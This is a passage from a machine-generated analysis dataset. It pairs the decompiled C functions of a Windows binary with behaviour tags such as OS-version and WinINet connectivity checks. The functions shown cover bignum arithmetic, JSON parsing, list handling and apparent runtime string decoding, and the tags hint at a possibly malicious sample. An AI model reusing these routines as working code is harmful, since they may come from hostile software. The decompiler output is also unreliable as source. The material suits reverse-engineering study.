        "decompiled_code": "\nuint __cdecl fcn.004135d9(uint *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t *var_8h;\n    \n    uVar2 = arg_10h;\n    var_18h = arg_10h * 2;\n    iVar4 = var_18h;\n    puVar7 = arg_8h;\n    if (var_18h != 0) {\n        for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n    }\n    arg_10h = 0;\n    var_18h = var_18h + -1;\n    if (uVar2 != 0) {\n        var_10h = arg_ch;\n        uVar6 = 1;\n        var_1ch = arg_8h + uVar2;\n        do {\n            iVar4 = uVar6 * 2 + -2;\n            var_14h = iVar4;\n            fcn.00412944(&var_24h);\n            uVar5 = arg_8h[iVar4];\n            var_24h = var_24h + uVar5;\n            if (var_24h < uVar5) {\n                var_20h = var_20h + 1;\n            }\n            uVar5 = 0;\n            if ((var_14h == var_18h) && (arg_10h != 0)) {\n                var_20h = var_20h + arg_10h;\n                uVar5 = var_20h < arg_10h;\n                arg_10h = 0;\n            }\n            arg_8h[iVar4] = var_24h;\n            var_ch = uVar6;\n            if (uVar6 < uVar2) {\n                var_14h = uVar6 * 2 + -1;\n                var_28h = uVar5;\n                var_8h = arg_8h + var_14h;\n                do {\n                    uVar3 = var_20h;\n                    fcn.00412944(&var_24h);\n                    uVar8 = var_24h * 2 + uVar3;\n                    uVar5 = -(var_20h >> 0x1f);\n                    var_20h = var_20h * 2 | var_24h >> 0x1f;\n                    if ((uVar8 < uVar3) && (var_20h = var_20h + 1,  var_20h == 0)) {\n                        uVar5 = uVar5 + 1;\n                    }\n                    var_20h = var_20h + var_28h;\n                    if (var_20h < var_28h) {\n                        uVar5 = uVar5 + 1;\n                    }\n                    var_24h = uVar8 + *var_8h;\n                    if ((var_24h < *var_8h) && (var_20h = var_20h + 1,  var_20h == 0)) {\n                        uVar5 = uVar5 + 1;\n                    }\n                    if ((var_14h == var_18h) && (arg_10h != 0)) {\n                        var_20h = var_20h + arg_10h;\n                        if (var_20h < arg_10h) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        arg_10h = 0;\n                    }\n                    var_ch = var_ch + 1;\n                    puVar1 = var_8h + 1;\n                    var_14h = var_14h + 1;\n                    *var_8h = var_24h;\n                    var_28h = uVar5;\n                    var_8h = puVar1;\n                } while (var_ch < uVar2);\n            }\n            var_10h = var_10h + 4;\n            *var_1ch = var_20h;\n            var_18h = (uVar2 - 1) + uVar6;\n            bVar9 = uVar6 < uVar2;\n            uVar6 = uVar6 + 1;\n            arg_10h = uVar5;\n            var_1ch = var_1ch + 1;\n        } while (bVar9);\n    }\n    return 0;\n}\n",
        "token_count": 1120
    },
    "0041377d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0041377d(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (param_2 != 0) {\n        do {\n            if (*(param_1 + uVar1 * 4) != 0) {\n                return 0;\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_2);\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "0041379d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0041379d(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        if (iVar1 == 0) {\n            return 0;\n        }\n        in_EAX = iVar1 + -1;\n    } while (*(param_1 + (iVar1 + -1) * 4) == 0);\n    return iVar1;\n}\n",
        "token_count": 103
    },
    "004138f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004138f4(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t *puVar5;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_10h < 0x20) {\n        var_8h = 0;\n        uVar2 = arg_10h;\n        var_4h = arg_14h;\n        uVar1 = var_8h;\n        if (arg_14h != 0) {\n            puVar5 = arg_ch + arg_14h * 4;\n            do {\n                var_4h = var_4h - 1;\n                puVar5 = puVar5 + -1;\n                uVar1 = (*puVar5 & ~(-1 << (uVar2 & 0x1f))) << (0x20 - uVar2 & 0x1f);\n                *((arg_8h - arg_ch) + puVar5) = *puVar5 >> (uVar2 & 0x1f) | var_8h;\n                var_8h = uVar1;\n            } while (var_4h != 0);\n        }\n    }\n    else {\n        uVar3 = 0;\n        uVar1 = arg_10h >> 5;\n        if (arg_14h != 0) {\n            puVar4 = arg_ch + uVar1 * 4;\n            do {\n                if (uVar3 + uVar1 < arg_14h) {\n                    *(arg_8h + uVar3 * 4) = *puVar4;\n                }\n                else {\n                    *(arg_8h + uVar3 * 4) = 0;\n                }\n                uVar3 = uVar3 + 1;\n                puVar4 = puVar4 + 1;\n            } while (uVar3 < arg_14h);\n        }\n        arg_10h = arg_10h & 0x1f;\n        uVar1 = *(arg_ch + -4 + uVar1 * 4) >> arg_10h;\n        if (arg_10h != 0) {\n            uVar3 = fcn.004138f4(arg_8h, arg_8h, arg_10h, arg_14h);\n            uVar1 = uVar1 | uVar3;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 589
    },
    "00413b65": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00413b65(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    if (param_2 == 0) {\n        return -1;\n    }\n    uVar1 = 1;\n    if (1 < param_2) {\n        do {\n            if (param_1[uVar1] != 0) {\n                return 1;\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_2);\n    }\n    return (1 < *param_1) - (*param_1 == 0);\n}\n",
        "token_count": 146
    },
    "00413d17": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00413d17(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_10h_00;\n    int32_t arg_ch_00;\n    int32_t arg_18h;\n    int32_t iVar1;\n    int32_t arg_ch_01;\n    int32_t arg_8h_01;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint unaff_ESI;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00412833();\n    arg_10h_00 = fcn.00412833();\n    arg_ch_00 = fcn.00412833();\n    arg_18h = fcn.00412833();\n    iVar1 = fcn.00412833();\n    arg_ch_01 = fcn.00412833();\n    arg_8h_01 = fcn.00412833();\n    iVar2 = fcn.00412833();\n    fcn.00413817();\n    fcn.004137e3(arg_ch);\n    fcn.004137fb();\n    fcn.004137e3(arg_10h);\n    var_1ch = 1;\n    iVar3 = fcn.0041377d(arg_18h);\n    iVar4 = var_1ch;\n    if (iVar3 == 0) {\n        do {\n            var_1ch = iVar4;\n            fcn.00413339(arg_8h_01, arg_ch_01, arg_10h_00, unaff_ESI, arg_18h, unaff_ESI);\n            fcn.0041326c(arg_8h_01, arg_ch_00, unaff_ESI);\n            fcn.004131e0(iVar2);\n            fcn.004137e3(arg_ch_00);\n            fcn.004137e3(iVar1);\n            fcn.004137e3(arg_18h);\n            fcn.004137e3(arg_ch_01);\n            iVar3 = fcn.0041377d(arg_18h);\n            iVar4 = -var_1ch;\n        } while (iVar3 == 0);\n        if (0 < var_1ch) {\n            fcn.0041321b(arg_8h_00, unaff_ESI);\n            goto code_r0x00413e56;\n        }\n    }\n    fcn.004137e3(arg_8h_00);\ncode_r0x00413e56:\n    iVar4 = fcn.00413b65();\n    if (iVar4 != 0) {\n        fcn.004137fb();\n    }\n    if (arg_8h_00 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_ch_00 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (iVar1 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_10h_00 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_18h != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_ch_01 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_8h_01 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (iVar2 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    return iVar4 != 0;\n}\n",
        "token_count": 914
    },
    "00414515": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414515(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint in_ECX;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    ulong uVar9;\n    uint uStack572;\n    uint var_234h;\n    uint var_230h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint32_t *var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    \n    uVar1 = fcn.004137b1();\n    if (uVar1 == 0) {\n        fcn.00413817();\n    }\n    else {\n        if (uVar1 != 1) {\n            var_18h = NULL;\n            do {\n                if ((0x1f < var_18h) || (puVar4 = var_18h * 4 + 0x41b11c,  uVar1 <= *puVar4 && *puVar4 != uVar1)) break;\n                var_18h = var_18h + 1;\n            } while (var_18h < 0x8);\n            if (var_18h < 0x2) {\n                uVar2 = fcn.004143c4(arg_8h, in_ECX, arg_ch, arg_10h);\n                return uVar2;\n            }\n            var_10h = in_EAX * 2;\n            var_ch = fcn.00412833();\n            var_1ch = fcn.00412833();\n            var_28h = fcn.00412833();\n            var_8h = fcn.00412833();\n            fcn.00413cc2(var_28h, in_ECX, in_ECX, arg_10h);\n            uVar1 = 1;\n            var_30h = var_18h + -1;\n            var_34h = 1 << (var_30h & 0x1f);\n            if (1 < var_34h) {\n                do {\n                    uVar2 = fcn.00412833();\n                    (&var_234h)[uVar1] = uVar2;\n                    fcn.004137e3((&uStack572)[uVar1]);\n                    fcn.0041326c(var_28h, uVar2, in_EAX);\n                    fcn.00413339(var_1ch, uVar2, var_ch, var_10h, arg_10h, in_EAX);\n                    uVar1 = uVar1 + 1;\n                } while (uVar1 < var_34h);\n            }\n            var_2ch = 1;\n            uVar9 = fcn.0041379d(arg_ch);\n            var_20h = uVar9;\n            puVar4 = (uVar9 >> 0x20) + -4 + var_20h * 4;\n            var_14h = 0x80000000;\n            do {\n                if ((var_14h & *puVar4) != 0) break;\n                var_14h = var_14h >> 1;\n            } while (var_14h != 0);\n            iVar6 = 0;\n            uVar1 = 0;\n            var_24h = 0;\n            if (var_20h != 0) {\n                var_18h = puVar4;\n                do {\n                    if (var_2ch == 0) {\n                        fcn.004135d9(var_ch, var_8h, in_EAX);\n                        fcn.00413339(var_1ch, var_8h, var_ch, var_10h, arg_10h, in_EAX);\n                    }\n                    if (var_24h == 0) {\n                        if ((*var_18h & var_14h) != 0) {\n                            uVar1 = 1;\n                            var_24h = 1;\n                            iVar5 = var_20h;\n                            puVar4 = var_18h;\n                            uVar3 = var_14h;\n                            for (iVar7 = var_30h; iVar6 = var_30h,  iVar7 != 0; iVar7 = iVar7 + -1) {\n                                if (uVar3 == 1) {\n                                    iVar5 = iVar5 + -1;\n                                    uVar3 = 0x80000000;\n                                    puVar4 = puVar4 + -1;\n                                }\n                                else {\n                                    uVar3 = uVar3 >> 1;\n                                }\n                                uVar1 = uVar1 * 2;\n                                if ((iVar5 != 0) && ((*puVar4 & uVar3) != 0)) {\n                                    uVar1 = uVar1 | 1;\n                                }\n                            }\n                            for (; (iVar6 != 0 && ((uVar1 & 1) == 0)); uVar1 = uVar1 >> 1) {\n                                iVar6 = iVar6 + -1;\n                            }\n                            uVar1 = uVar1 >> 1;\n                            goto code_r0x00414709;\n                        }\n                    }\n                    else {\n                        if (iVar6 != 0) {\n                            iVar6 = iVar6 + -1;\n                        }\ncode_r0x00414709:\n                        if (iVar6 == 0) {\n                            if (var_2ch == 0) {\n                                fcn.0041326c((&var_234h)[uVar1], var_8h, in_EAX);\n                                fcn.00413339(var_1ch, var_8h, var_ch, var_10h, arg_10h, in_EAX);\n                            }\n                            else {\n                                fcn.004137e3((&var_234h)[uVar1]);\n                                var_2ch = 0;\n                            }\n                            iVar6 = 0;\n                            var_24h = 0;\n                        }\n                    }\n                    if (var_14h == 1) {\n                        var_20h = var_20h + -1;\n                        var_18h = var_18h + -1;\n                        var_14h = 0x80000000;\n                    }\n                    else {\n                        var_14h = var_14h >> 1;\n                    }\n                } while (var_20h != 0);\n                if (var_24h != 0) {\n                    if (var_2ch == 0) {\n                        fcn.0041326c((&var_234h)[uVar1], var_8h, in_EAX);\n                        fcn.00413339(var_1ch, var_8h, var_ch, var_10h, arg_10h, in_EAX);\n                    }\n                    else {\n                        fcn.004137e3((&var_234h)[uVar1]);\n                    }\n                }\n            }\n            fcn.004137e3(var_8h);\n            if (var_8h != 0) {\n                fcn.004137fb();\n            }\n            fcn.00412847();\n            if (var_28h != 0) {\n                fcn.004137fb();\n            }\n            fcn.00412847();\n            if (var_ch != 0) {\n                fcn.004137fb();\n            }\n            fcn.00412847();\n            if (var_1ch != 0) {\n                fcn.004137fb();\n            }\n            fcn.00412847();\n            if (1 < var_34h) {\n                piVar8 = &var_230h;\n                iVar6 = var_34h - 1;\n                do {\n                    if (*piVar8 != 0) {\n                        fcn.004137fb();\n                    }\n                    fcn.00412847();\n                    piVar8 = piVar8 + 1;\n                    iVar6 = iVar6 + -1;\n                } while (iVar6 != 0);\n            }\n            return 0;\n        }\n        fcn.00413c47(arg_8h, in_ECX, in_EAX, arg_10h);\n    }\n    return 1;\n}\n",
        "token_count": 1883
    },
    "00415007": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415007(uint *arg_8h, uint32_t arg_ch, uint *arg_10h)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    if (in_EAX == NULL) {\n        uVar4 = 9;\n    }\n    else if (arg_8h == NULL) {\n        uVar4 = 0xf;\n    }\n    else if (arg_ch < 0x100) {\n        puVar1 = arg_10h;\n        if ((arg_10h == NULL) && (puVar1 = fcn.0040ae05(0),  puVar1 == NULL)) {\n            uVar4 = 0x12;\n        }\n        else {\n            puVar3 = puVar1;\n            for (iVar2 = 0xb2; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = *in_EAX;\n                in_EAX = in_EAX + 1;\n                puVar3 = puVar3 + 1;\n            }\n            fcn.0041486c();\n            puVar3 = puVar1 + arg_ch * 0x20 + 0x92;\n            for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *arg_8h = *puVar3;\n                puVar3 = puVar3 + 1;\n                arg_8h = arg_8h + 1;\n            }\n            if (arg_10h == NULL) {\n                sub.ntdll.dll_memset(puVar1, 0, arg_ch * 0x80 + 0x2c8);\n                fcn.0040af12();\n            }\n            uVar4 = 0;\n        }\n    }\n    else {\n        uVar4 = 0x11;\n    }\n    return uVar4;\n}\n",
        "token_count": 438
    },
    "00415150": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00415150(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, uint32_t arg_1ch, \n            uint arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    uint32_t in_EAX;\n    int32_t arg_10h_00;\n    uint32_t unaff_EDI;\n    uint var_2cch;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0xf;\n    }\n    else if (arg_28h == 0) {\n        arg_8h = 10;\n    }\n    else if (unaff_EDI < 0x100) {\n        if (in_EAX < 0x100) {\n            if (arg_10h < 0x100) {\n                if (arg_1ch < 0x1001) {\n                    if (arg_24h - 1U < 0x200) {\n                        if (arg_ch == 0) {\n                            arg_8h = 0xd;\n                        }\n                        else {\n                            fcn.004150a0(&var_2cch, arg_ch, arg_14h, unaff_EDI, in_EAX, arg_18h, arg_1ch, arg_20h, \n                                         arg_24h, arg_28h);\n                            if (*0x41e874 != NULL) {\n                                (**0x41e874)(arg_8h, 0x418fa8, arg_ch, arg_10h, arg_14h);\n                            }\n                            arg_10h_00 = fcn.0040ae05(0);\n                            if (arg_10h_00 != 0) {\n                                arg_8h = fcn.00415007(arg_8h, unaff_EDI, arg_10h_00);\n                                fcn.0040af12();\n                            }\n                        }\n                    }\n                    else {\n                        arg_8h = 2;\n                    }\n                }\n                else {\n                    arg_8h = 0xc;\n                }\n            }\n            else {\n                arg_8h = 0xb;\n            }\n        }\n        else {\n            arg_8h = 0x10;\n        }\n    }\n    else {\n        arg_8h = 0x11;\n    }\n    return arg_8h;\n}\n",
        "token_count": 538
    },
    "004152d3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar * fcn.004152d3(uint param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    \n    pcVar2 = fcn.0040bd6e(param_1);\n    if (pcVar2 != NULL) {\n        cVar1 = *pcVar2;\n        pcVar5 = pcVar2;\n        while (cVar1 != '\\0') {\n            uVar3 = fcn.0040a88f(str._aeQ_, 0xe, 0xe534ca5c, 0);\n            iVar4 = (*_sym.imp.SHLWAPI.dll_StrChrA)(uVar3, *pcVar5);\n            if (iVar4 != 0) {\n                *pcVar5 = '_';\n            }\n            pcVar5 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n        }\n    }\n    return pcVar2;\n}\n",
        "token_count": 219
    },
    "00415388": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00415388(int32_t param_1, char param_2)\n\n{\n    if (param_1 != 0) {\n        do {\n            fcn.0040af12();\n            if (*(param_1 + 0x18) == '\\0') {\n                fcn.0040af12();\n                if (*(param_1 + 0x14) == 3) {\n                    fcn.0040af12();\n                }\n                if (*(param_1 + 0x10) != 0) {\n                    fcn.00415388(*(param_1 + 0x10), 1);\n                }\n            }\n            if (param_2 == '\\0') {\n                fcn.0041557d();\n                fcn.0040af12();\n                return;\n            }\n            param_1 = *(param_1 + 8);\n            fcn.0040af12();\n        } while (param_1 != 0);\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00415449": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415449(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_2 + 0x10);\n    if (iVar1 == 0) {\n        *(param_2 + 0x10) = param_1;\n    }\n    else {\n        for (; *(iVar1 + 8) != 0; iVar1 = *(iVar1 + 8)) {\n        }\n        *(iVar1 + 8) = param_1;\n        *(param_1 + 0xc) = iVar1;\n    }\n    *(param_1 + 4) = param_2;\n    return;\n}\n",
        "token_count": 152
    },
    "00415896": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00415896(int32_t arg_8h, uint arg_ch, uint32_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint32_t var_18h;\n    uint8_t *var_14h;\n    uint8_t *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = fcn.0040a88f(0x419064, 4, 0x5219c080, 0);\n    puVar3 = fcn.00415769(uVar2);\n    if ((puVar3 != NULL) && (*puVar3 == 0x22)) {\n        *arg_10h = *arg_10h - 1;\n        if (*arg_10h != 0) {\n            var_8h = 0;\n            uVar1 = puVar3[1];\n            var_10h = puVar3 + 1;\n            while (((uVar1 != 0 && (*var_10h != 0x22)) && (*arg_10h != 0))) {\n                uVar4 = *arg_10h - 1;\n                *arg_10h = uVar4;\n                puVar7 = var_10h + 1;\n                uVar6 = var_8h + 1;\n                if (*var_10h == 0x5c) {\n                    if (var_10h[1] == 0x75) {\n                        puVar7 = var_10h + 6;\n                        uVar6 = uVar4;\n                        if (4 < uVar4) {\n                            uVar6 = 5;\n                        }\n                        iVar5 = -uVar6;\n                        var_8h = var_8h + 3;\n                    }\n                    else {\n                        puVar7 = var_10h + 2;\n                        iVar5 = -1;\n                        var_8h = var_8h + 1;\n                    }\n                    *arg_10h = uVar4 + iVar5;\n                    uVar6 = var_8h;\n                }\n                var_8h = uVar6;\n                var_10h = puVar7;\n                uVar1 = *var_10h;\n            }\n            puVar7 = fcn.0040ae05(0);\n            if (puVar7 != NULL) {\n                var_4h = 0;\n                var_14h = puVar7;\n                if (var_8h != 0) {\n                    do {\n                        puVar8 = puVar3 + 1;\n                        uVar6 = *puVar8;\n                        if (*puVar8 == 0x5c) {\n                            puVar8 = puVar3 + 2;\n                            uVar1 = *puVar8;\n                            if (uVar1 == 0x62) {\n                                *puVar7 = 8;\n                                goto code_r0x00415aea;\n                            }\n                            if (uVar1 == 0x66) {\n                                *puVar7 = 0xc;\n                                goto code_r0x00415aea;\n                            }\n                            if (uVar1 == 0x6e) {\n                                *puVar7 = 10;\n                                goto code_r0x00415aea;\n                            }\n                            if (uVar1 == 0x72) {\n                                *puVar7 = 0xd;\n                                goto code_r0x00415aea;\n                            }\n                            if (uVar1 == 0x74) {\n                                *puVar7 = 9;\n                                goto code_r0x00415aea;\n                            }\n                            if (uVar1 != 0x75) {\n                                *puVar7 = uVar1;\n                                goto code_r0x00415aea;\n                            }\n                            uVar2 = fcn.0040a88f(0x41907c, 3, 0x88c9348d, 0);\n                            iVar5 = fcn.0040c102(uVar2, &var_ch);\n                            if (((iVar5 == 0) || ((puVar8 = puVar3 + 6,  0xdbff < var_ch && (var_ch < 0xe000)))) ||\n                               (var_ch == 0)) goto code_r0x00415aeb;\n                            if ((var_ch != 0xfe) && (var_ch != 0xff)) {\n                                var_4h = var_4h + 2;\n                                uVar6 = var_ch;\n                                goto code_r0x00415969;\n                            }\n                            if (var_ch - 0xd800 < 0x400) {\n                                if ((puVar3[7] == 0x5c) && (puVar3[8] == 0x75)) {\n                                    uVar2 = fcn.0040a88f(0x41907c, 3, 0x88c9348d, 0);\n                                    iVar5 = fcn.0040c102(uVar2, &var_18h);\n                                    if ((iVar5 != 0) && (puVar8 = puVar3 + 0xc,  var_18h - 0xdc00 < 0x400)) {\n                                        var_ch = (var_18h & 0x3bf | 0x40) << 10 | var_18h & 0x3ff;\n                                        goto code_r0x00415a82;\n                                    }\n                                }\n                            }\n                            else {\ncode_r0x00415a82:\n                                if (var_ch < 0x80) {\n                                    uVar6 = 1;\n                                    uVar4 = uVar6;\n                                }\n                                else if (var_ch < 0x800) {\n                                    uVar6 = 2;\n                                    uVar4 = uVar6;\n                                }\n                                else {\n                                    uVar6 = 4 - (var_ch < 0x10000);\n                                    uVar4 = uVar6;\n                                }\n                                for (; 1 < uVar6; uVar6 = uVar6 - 1) {\n                                    puVar7[uVar6 - 1] = var_ch & 0x3f | 0x80;\n                                    var_ch = var_ch >> 6;\n                                }\n                                *puVar7 = *(uVar4 + 0x41b000) | var_ch;\n                                puVar7 = puVar7 + uVar4;\n                                var_4h = var_4h + uVar4;\n                            }\n                        }\n                        else {\ncode_r0x00415969:\n                            *puVar7 = uVar6;\ncode_r0x00415aea:\n                            puVar7 = puVar7 + 1;\n                        }\ncode_r0x00415aeb:\n                        var_4h = var_4h + 1;\n                        puVar3 = puVar8;\n                    } while (var_4h < var_8h);\n                }\n                *puVar7 = 0;\n                uVar2 = 0;\n                iVar5 = fcn.0040d6d1(var_14h, puVar7 - var_14h, &var_18h);\n                if (iVar5 != 0) {\n                    uVar2 = fcn.0040d55a(iVar5);\n                    fcn.0040af12();\n                }\n                *(arg_8h + 0x20) = uVar2;\n                fcn.0040af12();\n                puVar3 = fcn.0041578f(var_10h);\n                return puVar3;\n            }\n        }\n        puVar3 = NULL;\n    }\n    return puVar3;\n}\n",
        "token_count": 1722
    },
    "00415b52": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00415b52(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    char *pcVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    uVar1 = fcn.0040a88f(0x419064, 4, 0x5219c080, 0);\n    pcVar2 = fcn.00415769(uVar1);\n    if (((pcVar2 != NULL) && (*pcVar2 == '[')) && (pcVar2 = fcn.0041578f(pcVar2),  pcVar2 != NULL)) {\n        if (*pcVar2 == ']') {\ncode_r0x00415c1c:\n            uVar1 = fcn.0041578f(pcVar2);\n            return uVar1;\n        }\n        arg_8h = fcn.00415755(param_1);\n        *(param_1 + 0x10) = arg_8h;\n        if (((arg_8h != 0) && (pcVar2 = fcn.00415d71(arg_8h, pcVar2, in_EAX),  pcVar2 != NULL)) && (*in_EAX != 0)) {\n            while (((*pcVar2 == ',' && (pcVar2 = fcn.0041578f(pcVar2),  pcVar2 != NULL)) &&\n                   (arg_8h_00 = fcn.00415755(param_1),  arg_8h_00 != 0))) {\n                *(arg_8h + 8) = arg_8h_00;\n                *(arg_8h_00 + 0xc) = arg_8h;\n                pcVar2 = fcn.00415d71(arg_8h_00, pcVar2, in_EAX);\n                if ((pcVar2 == NULL) || (arg_8h = arg_8h_00,  *in_EAX == 0)) break;\n            }\n            if ((*in_EAX != 0) && ((pcVar2 != NULL && (*pcVar2 == ']')))) goto code_r0x00415c1c;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 493
    },
    "00415c2e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
